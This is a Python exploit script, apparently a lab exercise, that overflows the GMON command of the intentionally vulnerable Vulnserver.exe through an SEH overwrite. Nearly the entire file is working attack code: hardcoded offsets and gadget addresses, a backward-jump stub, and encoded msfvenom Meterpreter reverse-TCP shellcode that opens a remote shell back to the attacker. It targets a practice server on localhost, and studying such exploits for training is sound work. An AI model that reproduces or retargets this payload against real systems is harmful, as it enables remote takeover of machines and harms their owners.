import socket
import struct

'''
    +-------------------------------------------------------+
    | *** GMON exploit for Vulnserver.exe ***               |
    | EBP offset: 1903 bytes                                |
    | SEH offset: 3423 bytes                                |
    | JMP EBP Address: 0x625011f9                           |
    | POP POP RET: 0x625010b4                               |
    +-------------------------------------------------------+
'''


def main():
    host = "127.0.0.1"
    port = 9999

    # Offsets section.
    tot_length = 10007
    seh_offset = 3423

    # Build the payload to send.
    header = "GMON "
    slash = "\x2F" * 100
    sc = "A" * 3

    '''
        +-------------------------------------------------------+
        |           *** Shellcode generation ***                |
        | msfvenom -p windows/meterpreter/reverse_tcp           |
        |   LHOST=eth1 LPORT=443 EXITFUNC=seh -f python -v sc   |
        |   -e x86/alpha_mixed -b '\x00\x0a\x0d'                |
        +-------------------------------------------------------+
    '''

    sc += b"\x89\xe0\xda\xcd\xd9\x70\xf4\x5e\x56\x59\x49\x49\x49"
    sc += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
    sc += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
    sc += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
    sc += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x5a\x48\x6c"
    sc += b"\x42\x35\x50\x73\x30\x75\x50\x35\x30\x6c\x49\x68\x65"
    sc += b"\x30\x31\x79\x50\x43\x54\x6c\x4b\x76\x30\x50\x30\x4c"
    sc += b"\x4b\x30\x52\x44\x4c\x4c\x4b\x36\x32\x77\x64\x4c\x4b"
    sc += b"\x42\x52\x61\x38\x76\x6f\x6c\x77\x71\x5a\x61\x36\x34"
    sc += b"\x71\x59\x6f\x6e\x4c\x45\x6c\x61\x71\x71\x6c\x53\x32"
    sc += b"\x54\x6c\x67\x50\x6a\x61\x48\x4f\x56\x6d\x73\x31\x68"
    sc += b"\x47\x6d\x32\x4b\x42\x61\x42\x66\x37\x4c\x4b\x73\x62"
    sc += b"\x36\x70\x4e\x6b\x63\x7a\x77\x4c\x4c\x4b\x42\x6c\x64"
    sc += b"\x51\x31\x68\x48\x63\x67\x38\x76\x61\x5a\x71\x32\x71"
    sc += b"\x4e\x6b\x71\x49\x67\x50\x55\x51\x4e\x33\x4e\x6b\x32"
    sc += b"\x69\x76\x78\x69\x73\x34\x7a\x67\x39\x4c\x4b\x66\x54"
    sc += b"\x4e\x6b\x45\x51\x4a\x76\x74\x71\x49\x6f\x4c\x6c\x5a"
    sc += b"\x61\x68\x4f\x44\x4d\x67\x71\x5a\x67\x34\x78\x4d\x30"
    sc += b"\x30\x75\x58\x76\x67\x73\x73\x4d\x5a\x58\x47\x4b\x73"
    sc += b"\x4d\x51\x34\x32\x55\x59\x74\x51\x48\x4e\x6b\x61\x48"
    sc += b"\x65\x74\x57\x71\x6e\x33\x30\x66\x6e\x6b\x76\x6c\x30"
    sc += b"\x4b\x6e\x6b\x50\x58\x57\x6c\x65\x51\x7a\x73\x6e\x6b"
    sc += b"\x46\x64\x6c\x4b\x66\x61\x58\x50\x6c\x49\x71\x54\x64"
    sc += b"\x64\x77\x54\x53\x6b\x31\x4b\x55\x31\x42\x79\x73\x6a"
    sc += b"\x70\x51\x79\x6f\x59\x70\x71\x4f\x71\x4f\x71\x4a\x6e"
    sc += b"\x6b\x65\x42\x6a\x4b\x6c\x4d\x73\x6d\x73\x58\x66\x53"
    sc += b"\x44\x72\x37\x70\x63\x30\x50\x68\x64\x37\x63\x43\x76"
    sc += b"\x52\x71\x4f\x36\x34\x43\x58\x50\x4c\x63\x47\x36\x46"
    sc += b"\x43\x37\x6c\x49\x39\x78\x39\x6f\x48\x50\x6c\x78\x5a"
    sc += b"\x30\x65\x51\x57\x70\x63\x30\x71\x39\x4f\x34\x51\x44"
    sc += b"\x52\x70\x52\x48\x64\x69\x4d\x50\x62\x4b\x77\x70\x6b"
    sc += b"\x4f\x49\x45\x30\x6a\x34\x4a\x55\x38\x79\x50\x39\x38"
    sc += b"\x58\x48\x6f\x71\x35\x38\x75\x52\x75\x50\x75\x51\x4d"
    sc += b"\x6b\x4b\x39\x6b\x56\x42\x70\x62\x70\x62\x70\x50\x50"
    sc += b"\x51\x50\x50\x50\x73\x70\x52\x70\x42\x48\x59\x7a\x44"
    sc += b"\x4f\x6b\x6f\x69\x70\x69\x6f\x78\x55\x6f\x67\x71\x7a"
    sc += b"\x74\x50\x62\x76\x71\x47\x53\x58\x6c\x59\x4f\x55\x74"
    sc += b"\x34\x65\x31\x79\x6f\x6b\x65\x6c\x45\x6b\x70\x63\x44"
    sc += b"\x76\x6a\x6b\x4f\x52\x6e\x75\x58\x72\x55\x7a\x4c\x39"
    sc += b"\x78\x33\x57\x37\x70\x45\x50\x75\x50\x30\x6a\x77\x70"
    sc += b"\x72\x4a\x36\x64\x76\x36\x36\x37\x70\x68\x44\x42\x78"
    sc += b"\x59\x4f\x38\x43\x6f\x6b\x4f\x69\x45\x4f\x73\x6a\x58"
    sc += b"\x67\x70\x51\x6e\x75\x66\x4c\x4b\x44\x76\x53\x5a\x67"
    sc += b"\x30\x31\x78\x67\x70\x76\x70\x35\x50\x75\x50\x46\x36"
    sc += b"\x73\x5a\x77\x70\x33\x58\x63\x68\x4e\x44\x50\x53\x48"
    sc += b"\x65\x4b\x4f\x49\x45\x6e\x73\x46\x33\x70\x6a\x75\x50"
    sc += b"\x51\x46\x71\x43\x61\x47\x63\x58\x65\x52\x78\x59\x59"
    sc += b"\x58\x43\x6f\x59\x6f\x6b\x65\x4b\x33\x4a\x58\x47\x70"
    sc += b"\x73\x4d\x66\x48\x56\x38\x35\x38\x77\x70\x53\x70\x77"
    sc += b"\x70\x65\x50\x33\x5a\x53\x30\x66\x30\x32\x48\x44\x4b"
    sc += b"\x76\x4f\x34\x4f\x74\x70\x59\x6f\x49\x45\x32\x77\x73"
    sc += b"\x58\x71\x65\x30\x6e\x32\x6d\x43\x51\x4b\x4f\x4b\x65"
    sc += b"\x43\x6e\x61\x4e\x79\x6f\x76\x6c\x47\x54\x64\x4f\x6f"
    sc += b"\x75\x34\x30\x59\x6f\x69\x6f\x49\x6f\x58\x69\x6d\x4b"
    sc += b"\x39\x6f\x79\x6f\x59\x6f\x65\x51\x7a\x63\x46\x49\x4f"
    sc += b"\x36\x74\x35\x6f\x31\x39\x53\x4d\x6b\x39\x6e\x74\x4e"
    sc += b"\x44\x72\x48\x6a\x53\x5a\x47\x70\x30\x53\x49\x6f\x79"
    sc += b"\x45\x63\x5a\x33\x30\x39\x53\x41\x41"

    junk1 = "A" * (seh_offset - len(sc) - 4)
    nseh = "\xEB\x06\x90\x90"
    seh = struct.pack("<I", 0x625010b4)

    # Jumping back from limited shellcode space after our NSEH + SEH overwrite.
    jmp_back = "\xD9\xEE"               # fldz
    jmp_back += "\xD9\x74\x24\xF4"      # fstenv [esp-12]
    jmp_back += "\x59"                  # pop ecx
    jmp_back += "\x80\xC1\x0A"          # add cl, 10
    jmp_back += "\x90"                  # nop
    jmp_back += "\xFE\xCD"              # dec ch ; ECX - 256 bytes
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\xFE\xCD"              # dec ch
    jmp_back += "\x83\xE9\x6A"          # sub ecx, 0x6A ; Total: 3436 byte jump backwards
    jmp_back += "\xFF\xE1"              # jmp ecx

    junk2 = "\x90" * (tot_length - len(slash) - len(junk1) - len(nseh) - len(seh) - len(jmp_back))
    payload = header + slash + sc + junk1 + nseh + seh + jmp_back + junk2

    # Set up connections, send the payload.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print(s.recv(10000))
    s.send(payload)
    print(s.recv(10000))
    s.close()


if __name__ == "__main__":
    main()
